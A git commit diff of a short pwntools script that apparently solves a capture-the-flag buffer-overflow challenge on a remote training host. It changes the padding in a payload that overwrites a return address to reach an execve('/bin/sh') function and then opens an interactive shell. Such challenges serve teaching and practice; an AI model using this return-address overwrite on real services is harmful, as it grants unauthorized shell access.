a4d8bf9a74068acf49cc3758896cb3e04422e589
Ethan Lai <58878526+wh00am1@users.noreply.github.com>
2020-08-21 14:19:17 +0800

    Update bof2.py

--- isc.taiwan-te.ch/bof2.py
+++ isc.taiwan-te.ch/bof2.py
@@ -3,7 +3,7 @@
 from pwn import *
 
 p = remote('isc.taiwan-te.ch', 10001)
-payload = '\0'*(16 + 8) + p64(0x004006ac) 
+payload = 'A'*(16 + 8) + p64(0x004006ac) 
 #rbp - rsp = 0x10(16), ret to execve("/bin/sh", 0, 0)in <y0u_c4n7_533_m3>
 p.sendline(payload)
 p.interactive()
